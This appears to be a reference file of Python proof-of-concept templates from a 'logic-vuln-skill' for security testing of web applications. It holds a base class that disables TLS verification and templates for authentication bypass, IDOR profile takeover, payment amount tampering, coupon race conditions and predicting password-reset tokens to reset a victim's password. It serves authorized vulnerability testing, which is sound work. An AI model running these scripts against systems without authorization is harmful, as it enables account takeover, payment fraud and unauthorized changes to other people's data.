# PoC Templates

Base class and templates for generating Python proof-of-concept scripts.

---

## Base Class (Required)

Every PoC script MUST inherit from this base class:

```python
#!/usr/bin/env python3
"""
Business Logic Vulnerability PoC
Generated by logic-vuln-skill
"""

import requests
import json
import time
import sys
import urllib3
from abc import ABC, abstractmethod

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


class BasePoC(ABC):
    """Base class for all business logic vulnerability PoC scripts."""

    VULN_ID = "VULN-XXX-XXX"
    VULN_NAME = "Vulnerability Name"
    VULN_TYPE = "Vulnerability Type"
    SEVERITY = "Critical"
    MODULE = "module_name"

    def __init__(self, target: str, timeout: int = 10, proxy: str = None):
        self.target = target.rstrip('/')
        self.timeout = timeout
        self.session = requests.Session()
        self.session.verify = False
        self.session.timeout = timeout
        if proxy:
            self.session.proxies = {'http': proxy, 'https': proxy}
        self.results = {
            "vulnerable": False,
            "target": target,
            "vuln_id": self.VULN_ID,
            "vuln_name": self.VULN_NAME,
            "vuln_type": self.VULN_TYPE,
            "severity": self.SEVERITY,
            "module": self.MODULE,
            "evidence": [],
            "error": None
        }

    def log(self, message: str):
        """Print timestamped log message."""
        print(f"[{time.strftime('%H:%M:%S')}] {message}")

    def add_evidence(self, payload: str, response_code: int,
                     detail: str, raw_response: str = None):
        """Record exploitation evidence."""
        self.results["evidence"].append({
            "payload": payload,
            "response_code": response_code,
            "detail": detail,
            "raw_response": raw_response[:500] if raw_response else None,
            "timestamp": time.strftime('%Y-%m-%dT%H:%M:%SZ')
        })

    @abstractmethod
    def verify(self) -> bool:
        """
        Verify whether the vulnerability exists.
        Returns True if vulnerable, False otherwise.
        Must call self.add_evidence() with proof.
        """
        pass

    def setup(self):
        """Optional: Pre-exploitation setup (login, get tokens, etc.)."""
        pass

    def cleanup(self):
        """Optional: Post-exploitation cleanup."""
        pass

    def run(self) -> dict:
        """Execute the full PoC lifecycle."""
        self.log(f"=== PoC: {self.VULN_ID} - {self.VULN_NAME} ===")
        self.log(f"Target: {self.target}")
        self.log(f"Severity: {self.SEVERITY}")
        try:
            self.setup()
            self.results["vulnerable"] = self.verify()
            if self.results["vulnerable"]:
                self.log("[!] VULNERABLE - Exploitation successful")
            else:
                self.log("[-] NOT VULNERABLE - Exploitation failed")
        except requests.exceptions.ConnectionError:
            self.results["error"] = "Connection failed - target unreachable"
            self.log(f"[ERROR] {self.results['error']}")
        except requests.exceptions.Timeout:
            self.results["error"] = "Request timeout"
            self.log(f"[ERROR] {self.results['error']}")
        except Exception as e:
            self.results["error"] = str(e)
            self.log(f"[ERROR] {self.results['error']}")
        finally:
            self.cleanup()
        return self.results


def main(poc_class, default_target="http://localhost:8080"):
    """Standard main entry point for PoC scripts."""
    target = sys.argv[1] if len(sys.argv) > 1 else default_target
    proxy = sys.argv[2] if len(sys.argv) > 2 else None

    poc = poc_class(target=target, proxy=proxy)
    results = poc.run()

    print("\n" + "=" * 60)
    print(json.dumps(results, indent=2, ensure_ascii=False))

    sys.exit(0 if results["vulnerable"] else 1)
```

## Template: Authentication Bypass

```python
class AuthBypassPoC(BasePoC):
    VULN_ID = "LOGIN_001"
    VULN_NAME = "Authentication Bypass via [specific flaw]"
    VULN_TYPE = "Authentication Bypass"
    SEVERITY = "Critical"
    MODULE = "login"

    def verify(self) -> bool:
        # Step 1: Attempt login with bypass payload
        self.log("[*] Step 1: Sending bypass payload...")
        resp = self.session.post(f"{self.target}/api/login", json={
            "username": "admin",
            "password": "bypass_payload_here"
        })

        # Step 2: Check if authentication succeeded
        if resp.status_code == 200 and "token" in resp.json():
            self.add_evidence(
                payload="bypass_payload_here",
                response_code=resp.status_code,
                detail="Authentication bypassed, token received",
                raw_response=resp.text
            )
            return True

        return False

if __name__ == "__main__":
    main(AuthBypassPoC)
```

## Template: IDOR / Horizontal Privilege Escalation

```python
class IDORPoC(BasePoC):
    VULN_ID = "PROF_001"
    VULN_NAME = "IDOR in Profile Update"
    VULN_TYPE = "Horizontal Privilege Escalation"
    SEVERITY = "High"
    MODULE = "profile_update"

    def setup(self):
        # Login as low-privilege user
        self.log("[*] Setup: Logging in as attacker user...")
        resp = self.session.post(f"{self.target}/api/login", json={
            "username": "attacker",
            "password": "attacker_password"
        })
        self.token = resp.json().get("token", "")
        self.session.headers["Authorization"] = f"Bearer {self.token}"

    def verify(self) -> bool:
        # Try to modify another user's profile
        victim_user_id = 1  # Admin user ID
        self.log(f"[*] Attempting to modify user {victim_user_id}'s profile...")

        resp = self.session.put(
            f"{self.target}/api/user/{victim_user_id}/profile",
            json={"email": "attacker@evil.com"}
        )

        if resp.status_code == 200:
            # Verify the change took effect
            check = self.session.get(f"{self.target}/api/user/{victim_user_id}/profile")
            if "attacker@evil.com" in check.text:
                self.add_evidence(
                    payload=f"PUT /api/user/{victim_user_id}/profile",
                    response_code=resp.status_code,
                    detail="Modified another user's profile without authorization",
                    raw_response=resp.text
                )
                return True

        return False

if __name__ == "__main__":
    main(IDORPoC)
```

```python
class AmountTamperPoC(BasePoC):
    VULN_ID = "PAY_001"
    VULN_NAME = "Order Amount Tampering"
    VULN_TYPE = "Amount Tampering"
    SEVERITY = "Critical"
    MODULE = "payment"

    def setup(self):
        self.log("[*] Setup: Logging in and creating cart...")
        resp = self.session.post(f"{self.target}/api/login", json={
            "username": "testuser",
            "password": "testpass"
        })
        self.token = resp.json().get("token", "")
        self.session.headers["Authorization"] = f"Bearer {self.token}"

    def verify(self) -> bool:
        # Step 1: Create order normally
        self.log("[*] Step 1: Creating order...")
        order_resp = self.session.post(f"{self.target}/api/order/create", json={
            "product_id": 1,
            "quantity": 1
        })
        order_id = order_resp.json().get("order_id")
        original_amount = order_resp.json().get("total_amount")
        self.log(f"    Order {order_id}, original amount: {original_amount}")

        # Step 2: Tamper with amount during payment
        self.log("[*] Step 2: Submitting payment with tampered amount...")
        pay_resp = self.session.post(f"{self.target}/api/order/pay", json={
            "order_id": order_id,
            "amount": 0.01  # Tampered to minimum
        })

        if pay_resp.status_code == 200 and pay_resp.json().get("status") == "paid":
            self.add_evidence(
                payload=f"amount=0.01 (original: {original_amount})",
                response_code=pay_resp.status_code,
                detail=f"Payment accepted with tampered amount 0.01 instead of {original_amount}",
                raw_response=pay_resp.text
            )
            return True

        return False

if __name__ == "__main__":
    main(AmountTamperPoC)
```

## Template: Race Condition

```python
import threading

class RaceConditionPoC(BasePoC):
    VULN_ID = "PAY_002"
    VULN_NAME = "Double Payment via Race Condition"
    VULN_TYPE = "Race Condition"
    SEVERITY = "Critical"
    MODULE = "payment"

    def verify(self) -> bool:
        # Setup: Get a valid coupon/token
        self.log("[*] Preparing race condition test...")
        coupon_code = "DISCOUNT50"
        results_lock = threading.Lock()
        success_count = [0]

        def attempt_redeem():
            try:
                resp = self.session.post(f"{self.target}/api/coupon/redeem", json={
                    "coupon_code": coupon_code
                })
                if resp.status_code == 200 and resp.json().get("success"):
                    with results_lock:
                        success_count[0] += 1
            except Exception:
                pass

        # Launch concurrent requests
        self.log("[*] Launching 10 concurrent redemption requests...")
        threads = []
        for _ in range(10):
            t = threading.Thread(target=attempt_redeem)
            threads.append(t)

        for t in threads:
            t.start()
        for t in threads:
            t.join(timeout=10)

        self.log(f"    Successful redemptions: {success_count[0]}")

        if success_count[0] > 1:
            self.add_evidence(
                payload=f"10 concurrent requests for coupon {coupon_code}",
                response_code=200,
                detail=f"Coupon redeemed {success_count[0]} times (should be 1)"
            )
            return True

        return False

if __name__ == "__main__":
    main(RaceConditionPoC)
```

```python
import hashlib

class TokenPredictionPoC(BasePoC):
    VULN_ID = "PWD_003"
    VULN_NAME = "Predictable Password Reset Token"
    VULN_TYPE = "Predictable Token Generation"
    SEVERITY = "Critical"
    MODULE = "password_reset"

    def verify(self) -> bool:
        # Step 1: Request multiple reset tokens and analyze patterns
        self.log("[*] Step 1: Requesting reset tokens to analyze pattern...")
        tokens = []
        for i in range(3):
            resp = self.session.post(f"{self.target}/api/password/forgot", json={
                "email": f"test{i}@example.com"
            })
            if "token" in resp.json():
                tokens.append(resp.json()["token"])
            time.sleep(1)

        if len(tokens) < 2:
            self.log("[-] Could not collect enough tokens for analysis")
            return False

        # Step 2: Analyze token pattern (example: timestamp-based)
        self.log("[*] Step 2: Analyzing token patterns...")
        # Check if tokens are sequential, timestamp-based, or MD5(email+timestamp)
        # This is a simplified example - actual analysis depends on the pattern found

        # Step 3: Predict next token and attempt reset
        self.log("[*] Step 3: Attempting to predict and use reset token...")
        predicted_token = self._predict_token("victim@example.com")

        resp = self.session.post(f"{self.target}/api/password/reset", json={
            "token": predicted_token,
            "new_password": "hacked123"
        })

        if resp.status_code == 200 and resp.json().get("success"):
            self.add_evidence(
                payload=f"predicted token: {predicted_token}",
                response_code=resp.status_code,
                detail="Password reset with predicted token succeeded"
            )
            return True

        return False

    def _predict_token(self, email: str) -> str:
        """Predict token based on discovered pattern. Customize per target."""
        timestamp = int(time.time())
        return hashlib.md5(f"{email}{timestamp}".encode()).hexdigest()

if __name__ == "__main__":
    main(TokenPredictionPoC)
```

## PoC Output JSON Format

## PoC File Naming

```
poc_{MODULE_ID}.py       # e.g. poc_LOGIN_001.py
poc_{MODULE_ID}.json     # e.g. poc_LOGIN_001.json
poc_CHAIN_{SEQ}.py       # e.g. poc_CHAIN_001.py (for exploit chains)
```

## Quality Requirements

1. **Self-contained**: No external dependencies beyond `requests` and standard library
2. **Executable**: `python3 poc_LOGIN_001.py http://target:8080`
3. **Safe**: No destructive actions, no persistent modifications (or with cleanup)
4. **Evidence**: Always call `add_evidence()` with concrete proof
5. **Graceful**: Handle connection errors, timeouts, unexpected responses
6. **Documented**: Comments explaining each exploitation step
